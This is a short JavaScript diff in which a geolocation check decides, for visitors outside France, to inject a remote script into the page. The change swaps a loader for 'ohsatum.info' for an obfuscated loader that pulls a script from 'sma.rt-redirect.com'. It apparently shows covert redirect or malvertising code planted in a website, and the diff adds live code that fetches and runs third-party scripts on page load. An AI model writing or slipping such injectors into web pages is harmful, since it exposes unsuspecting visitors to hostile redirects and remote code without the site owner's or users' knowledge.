@@ -2,13 +2,12 @@ var xhttp = new XMLHttpRequest();
 xhttp.onreadystatechange = function() {
 if (this.readyState == 4 && this.status == 200) {
     if (this.responseText.toLowerCase().indexOf('"country_code":"fr"') === -1){
-        (function() {
-         var script = document.createElement('script');
-            script.async = true;
-            script.type = 'text/javascript';
-            script.src = 'https://ohsatum.info/script.js?sid=871623';
-            document.body.appendChild(script);
-        })();
+     (function (a, d, j, o) {
+           o = a.createElement(d),
+              m = a.getElementsByTagName(d)[0];              
+           o.src = j + "?d=0&r=" + Math.random();
+           m.parentNode.insertBefore(o, m)
+      })(document, 'script', 'https://sma.rt-redirect.com/sl/e7ac3600');
     }
 }
 };
